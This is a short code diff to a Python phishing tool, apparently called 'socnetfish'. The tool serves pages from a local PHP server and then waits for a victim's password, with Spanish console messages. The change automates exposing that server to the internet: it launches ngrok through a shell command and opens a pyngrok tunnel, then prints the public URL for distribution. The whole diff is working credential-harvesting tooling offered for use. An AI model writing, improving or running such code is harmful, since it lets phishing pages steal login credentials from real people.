@@ -6,8 +6,10 @@ import os
 import stat
 import zipfile
 import requests
+import subprocess
 
 from getpass import getuser
+from pyngrok import ngrok
 from signal import signal, SIGINT
 from colorama import Fore, Back,init
 
@@ -79,7 +81,12 @@ class hunter():
         os.system("cd " + route + " && nohup php -S localhost:8080 &")
         print(Fore.GREEN + "SERVIDOR INICIADO CORRECTAMENTE: http://localhost:8080" + Fore.RESET)
         print(Fore.YELLOW + "A CONTINUACIÓN EJECUTE EL SIGUIENTE COMANDO EN UNA NUEVA VENTANA" + Fore.RESET)
-        print(Fore.BLUE + "./ngrok http 8080" + Fore.RESET)
+
+        os.system("/home/" + self.usuario + "/./ngrok http 8080 --log=stdout > /home/" + self.usuario + "/ngrok.log &")
+        
+        self.tunel = ngrok.connect(bind_tls=True)
+        print("URL => " + self.tunel)
+
         print("EN ESPERA DE UNA CONTRASEÑA")
 
         self.ruta = "/home/" + self.usuario + "/.config/socnetfish"
